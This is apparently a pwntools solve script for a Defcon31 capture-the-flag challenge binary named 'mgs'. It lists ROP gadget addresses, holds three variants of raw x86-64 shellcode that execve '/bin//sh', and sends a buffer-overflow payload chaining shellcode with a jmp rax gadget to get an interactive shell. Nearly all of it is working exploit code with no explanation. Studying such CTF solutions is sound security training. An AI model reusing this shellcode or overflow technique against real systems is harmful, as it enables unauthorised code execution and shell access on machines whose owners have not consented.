from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#libc = ELF("../glibc/libc.so.6")
ld_preload = {"LD_PRELOAD": "/home/fresh/github/CTF/2023/Defcon31/htb-defcon/challenge/glibc/libc.so.6"}


#p = process("./mgs")
#p = remote("1.2.3.4", 30246)
p =gdb.debug('./mgs', '''
b *main
b *vuln
b *vuln+19''', env=ld_preload)

padA = b'A' * 24
rip = b'B' * 8

pop_rax = 0x00000000004503f7
pop_rdi = 0x00000000004021ef
pop_rsi = 0x000000000040a21e
pop_rdx = 0x0000000000482476
syscall = 0x0000000000401fa4
read = 0x44f990
ret = 0x000000000040101a
jmp_rax = 0x000000000040171c

flag = 0x4c70b0 # <_IO_2_1_stderr_+48>

#23
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'

#24
shellcode2 = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

#27
shellcode3 = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0'

shellcode3_2 = b'\x3b\x0f\x05'

exploit = shellcode3 + p64(jmp_rax) + shellcode3_2

p.sendline(exploit)
p.interactive()
